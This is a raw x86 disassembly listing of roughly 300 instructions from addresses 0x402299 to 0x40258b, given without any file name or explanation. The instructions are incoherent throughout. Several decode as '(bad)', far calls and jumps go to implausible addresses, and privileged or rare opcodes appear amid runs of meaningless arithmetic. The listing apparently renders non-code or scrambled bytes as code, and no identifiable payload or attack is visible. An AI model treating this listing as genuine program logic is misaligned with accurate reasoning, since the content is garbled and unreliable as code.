  402299:	push   esp
  40229a:	dec    eax
  40229b:	add    BYTE PTR [ecx],al
  40229d:	dec    eax
  40229e:	push   esp
  40229f:	cdq    
  4022a0:	call   0x7048:0x1004870
  4022a7:	mov    eax,ds:0x4834a2
  4022ac:	add    DWORD PTR [eax+0x34],ecx
  4022af:	test   eax,0x4870aa
  4022b4:	add    DWORD PTR [eax+0x70],ecx
  4022b7:	mov    cl,0xb2
  4022b9:	xor    al,0x48
  4022bb:	add    BYTE PTR [ecx],al
  4022bd:	dec    eax
  4022be:	xor    al,0xb9
  4022c0:	mov    WORD PTR [ebp-0x255d3cef],?
  4022c6:	mov    esp,0x91094dc7
  4022cb:	mov    al,bh
  4022cd:	adc    dh,BYTE PTR [eax+eax*1-0x74]
  4022d1:	jge    0x402327
  4022d3:	mov    al,BYTE PTR [ebp+0x42207b21]
  4022d9:	(bad)  
  4022da:	je     0x4022db
  4022dc:	add    DWORD PTR [ecx+0x3b],esp
  4022df:	mov    BYTE PTR [eax-0x6b],ah
  4022e2:	pop    ebp
  4022e3:	mov    edx,DWORD PTR [edx-0x49]
  4022e6:	and    BYTE PTR [ebx-0x7724cf40],dh
  4022ec:	add    DWORD PTR [eax],edi
  4022ee:	inc    ebp
  4022ef:	mov    ecx,DWORD PTR ds:0xa9af3b00
  4022f5:	adc    ebx,DWORD PTR [ecx+0x5c]
  4022f8:	fsub   QWORD PTR [ecx-0x34b20e4d]
  4022fe:	clc    
  4022ff:	mov    eax,DWORD PTR [ecx]
  402301:	dec    eax
  402302:	mov    cl,0xac
  402304:	popa   
  402305:	test   eax,0x8776f8c3
  40230a:	popf   
  40230b:	and    BYTE PTR ds:0xc6e90cbd,al
  402311:	sbb    BYTE PTR [eax],al
  402313:	add    BYTE PTR [ecx],al
  402315:	mov    ebp,DWORD PTR [eax-0x73]
  402318:	jle    0x402332
  40231a:	mov    eax,DWORD PTR [eax]
  40231c:	or     eax,0xa9ae3b00
  402321:	adc    ecx,DWORD PTR [ebp+0x4102b500]
  402327:	add    eax,0x4004cedc
  40232c:	or     al,0x2e
  40232e:	stos   DWORD PTR es:[edi],eax
  40232f:	sub    bh,BYTE PTR [eax-0x6f0c5a9c]
  402335:	inc    eax
  402336:	sub    al,0x79
  402338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402339:	dec    esp
  40233a:	shl    DWORD PTR [ebx-0x33],0x83
  40233e:	pusha  
  40233f:	ret    
  402340:	imul   esp,DWORD PTR [eax+eax*1],0xd2310120
  402347:	add    ch,BYTE PTR [ebx-0x64]
  40234a:	cmp    edi,edi
  40234c:	test   eax,0x8dd8e114
  402351:	fsub   st,st(3)
  402353:	add    BYTE PTR [eax+0x74],ah
  402356:	pop    ss
  402357:	jo     0x402392
  402359:	inc    edi
  40235a:	retf   
  40235b:	or     BYTE PTR [eax+0x11cc3c0],dh
  402361:	rol    BYTE PTR ds:0x4684b54b,0x54
  402368:	add    BYTE PTR [ecx-0x6a41b3ac],bh
  40236e:	mov    dh,BYTE PTR [esi-0x626a754f]
  402374:	call   0x4d24:0x351db91
  40237b:	cmc    
  40237c:	push   ecx
  40237d:	xchg   ebp,eax
  40237e:	popa   
  40237f:	ret    
  402380:	mov    ds:0xf25449ea,al
  402385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402386:	sbb    cl,BYTE PTR [edx-0x33861654]
  40238c:	and    al,0x0
  40238e:	xchg   dh,al
  402390:	std    
  402391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402392:	mov    ebx,DWORD PTR [eax+esi*2]
  402395:	add    DWORD PTR ds:0x6130d425,ebp
  40239b:	xchg   BYTE PTR [esp+edx*1+0x50],al
  40239f:	add    cl,dh
  4023a1:	sub    DWORD PTR [esi],esp
  4023a3:	jp     0x402364
  4023a5:	push   edx
  4023a6:	cmp    al,0x46
  4023a8:	jmp    0x1442498
  4023ad:	pop    edx
  4023ae:	call   0x723c17cb
  4023b3:	enter  0x5ef4,0xa0
  4023b7:	jbe    0x402434
  4023b9:	pop    ebx
  4023ba:	add    BYTE PTR [edi+0x58],ah
  4023bd:	or     BYTE PTR [edi+0x26],bl
  4023c0:	gs add al,bh
  4023c3:	retf   0x88bc
  4023c6:	icebp  
  4023c7:	sbb    eax,0xb63e6540
  4023cc:	cdq    
  4023cd:	cwde   
  4023ce:	dec    ebx
  4023cf:	out    0xed,al
  4023d1:	popa   
  4023d2:	dec    edx
  4023d3:	cmp    esp,DWORD PTR [ebp+0x16f8a81]
  4023d9:	push   0x741bab60
  4023de:	or     BYTE PTR cs:0x12040743,cl
  4023e5:	daa    
  4023e6:	xchg   edx,eax
  4023e7:	cmp    eax,0x16947a50
  4023ec:	jl     0x402382
  4023ee:	jp     0x402441
  4023f0:	push   esp
  4023f1:	jp     0x402387
  4023f3:	jl     0x40242f
  4023f5:	stos   BYTE PTR es:[edi],al
  4023f6:	test   DWORD PTR [eax+0x2],ebp
  4023f9:	outs   dx,BYTE PTR ds:[esi]
  4023fa:	push   ds
  4023fb:	sub    ecx,DWORD PTR [edi]
  4023fd:	adc    bl,BYTE PTR [ecx]
  4023ff:	sbb    DWORD PTR [ebx],eax
  402401:	and    esi,DWORD PTR [esi]
  402403:	xchg   edi,eax
  402404:	test   eax,0xc9b6d758
  402409:	or     al,bh
  40240b:	add    eax,0x66cb9a05
  402410:	bound  edx,QWORD PTR [esi]
  402412:	xchg   ebp,eax
  402413:	add    DWORD PTR [eax-0x59],ebx
  402416:	push   es
  402417:	push   ebx
  402418:	add    eax,0xbf5a5f3a
  40241d:	and    DWORD PTR [edx+0x50],ebp
  402420:	add    DWORD PTR [ebx-0x45933e6],ecx
  402426:	cdq    
  402427:	add    BYTE PTR [ecx],al
  402429:	adc    ch,BYTE PTR [ebp-0x5b66a27a]
  40242f:	inc    edi
  402430:	retf   
  402431:	bound  ebx,QWORD PTR [eax-0x2c]
  402434:	repnz push edx
  402436:	jbe    0x40241b
  402438:	ret    
  402439:	call   0x1b4f290
  40243e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40243f:	call   FWORD PTR [eax-0x59]
  402442:	sub    DWORD PTR [edi],eax
  402444:	leave  
  402445:	loop   0x4023e2
  402447:	push   esp
  402448:	pop    eax
  402449:	adc    dh,BYTE PTR [esp+eiz*8]
  40244c:	ja     0x4024a3
  40244e:	sar    bh,1
  402450:	pop    esi
  402451:	lea    eax,[ebp-0x12]
  402454:	hlt    
  402455:	test   DWORD PTR [ecx-0x2fdf332c],ecx
  40245b:	ficomp WORD PTR [eax+edx*1+0x24]
  40245f:	inc    esp
  402460:	add    DWORD PTR [eax],eax
  402462:	add    BYTE PTR [eax+0x69],ch
  402465:	add    BYTE PTR [eax],al
  402467:	add    ah,al
  402469:	xor    si,si
  40246c:	xchg   ecx,eax
  40246d:	mov    DWORD PTR [ebx],ebp
  40246f:	cdq    
  402470:	cmp    eax,0xe255dce0
  402475:	adc    ah,BYTE PTR [ebp+0x640a6ee7]
  40247b:	rol    BYTE PTR [ecx],1
  40247d:	sti    
  40247e:	out    dx,eax
  40247f:	arpl   dx,dx
  402481:	adc    ebp,DWORD PTR [edi-0x1]
  402484:	mov    DWORD PTR [ebp+0x75],esi
  402487:	sub    BYTE PTR [ebp-0x13],cl
  40248a:	dec    ebx
  40248b:	and    eax,0x24523716
  402490:	jns    0x40242b
  402492:	jmp    0x40250a
  402494:	loop   0x4024a9
  402496:	dec    ebp
  402497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402498:	xchg   ecx,eax
  402499:	sar    DWORD PTR [ecx+edx*4+0x554b0b6d],cl
  4024a0:	jno    0x40251c
  4024a2:	sub    esp,ebx
  4024a4:	ret    
  4024a5:	sub    eax,DWORD PTR [ecx]
  4024a7:	mov    dh,0x21
  4024a9:	call   FWORD PTR [ecx-0x6bdbb010]
  4024af:	mov    BYTE PTR [edi+0x0],ch
  4024b2:	jge    0x40244f
  4024b4:	adc    DWORD PTR [eax],eax
  4024b6:	aas    
  4024b7:	outs   dx,BYTE PTR ds:[esi]
  4024b8:	imul   ebp,DWORD PTR [eax-0x5a63efab],0x7e
  4024bf:	in     al,dx
  4024c0:	jmp    0x8ccc1545
  4024c5:	cld    
  4024c6:	imul   eax,DWORD PTR [eax],0xdcfc6806
  4024cc:	add    edi,edi
  4024ce:	push   ebp
  4024cf:	and    DWORD PTR [ebx+0x55],ecx
  4024d2:	xchg   edi,eax
  4024d3:	rol    DWORD PTR [ecx+0x6e000068],cl
  4024d9:	push   0x0
  4024db:	push   0x68
  4024dd:	push   0x8001036a
  4024e2:	aas    
  4024e3:	(bad)  
  4024e4:	test   eax,0xc1c40173
  4024e9:	and    BYTE PTR [edx*2-0x4a66f3c],0x2e
  4024f1:	mov    ds:0x5ec06144,eax
  4024f6:	(bad)  
  4024f7:	aam    0x4a
  4024f9:	jno    0x40252d
  4024fb:	into   
  4024fc:	bound  esp,QWORD PTR [ebp+0x76]
  4024ff:	aam    0x1e
  402501:	sbb    edx,DWORD PTR [ecx-0x7c]
  402504:	sub    ebp,DWORD PTR [ebp+0x52]
  402507:	pop    edi
  402508:	lds    edx,FWORD PTR [edx+0x27b3bc5d]
  40250e:	dec    esi
  40250f:	xchg   DWORD PTR [ecx+0x6e],ecx
  402512:	mov    eax,0xadfbd425
  402517:	jns    0x4024ce
  402519:	xchg   ebx,eax
  40251a:	adc    DWORD PTR [esi],esi
  40251c:	sub    al,0x8f
  40251e:	xchg   edx,eax
  40251f:	lea    esi,[eax-0x5c713a9c]
  402525:	cmp    ch,dh
  402527:	aas    
  402528:	adc    al,0xa6
  40252a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252c:	lea    esp,[edi-0x3ad51cf8]
  402532:	add    al,0xd7
  402534:	jnp    0x4024f3
  402536:	push   ds
  402537:	clc    
  402538:	xchg   DWORD PTR [ebx+0x12602],edx
  40253e:	add    BYTE PTR [edi+0x1],dh
  402544:	add    DWORD PTR [eax],eax
  402546:	add    BYTE PTR [eax],al
  402548:	add    DWORD PTR [eax],eax
  40254a:	add    BYTE PTR [eax],al
  40254c:	add    DWORD PTR [eax],eax
  40254e:	add    BYTE PTR [eax],al
  402550:	add    DWORD PTR [eax],eax
  402552:	add    BYTE PTR [eax],al
  402554:	add    DWORD PTR [edx-0x6ffeff70],esi
  40255a:	xchg   edx,eax
  40255b:	add    eax,0x42004
  402560:	add    DWORD PTR [edi+0x7b27347b],eax
  402566:	add    DWORD PTR [eax],0x44
  402569:	sahf   
  40256a:	fs je  0x40257b
  40256d:	sar    BYTE PTR [esi],0x36
  402570:	loop   0x402552
  402572:	loopne 0x4025d5
  402574:	cwde   
  402575:	test   DWORD PTR [edi-0x61],edx
  402578:	mov    gs,eax
  40257a:	push   0xd317fb6
  40257f:	clc    
  402580:	dec    esp
  402581:	mov    esp,0xbea016ad
  402586:	outs   dx,DWORD PTR ds:[esi]
  402587:	shl    edi,cl
  402589:	idiv   BYTE PTR [ebx]
  40258b:	.byte 0xb6
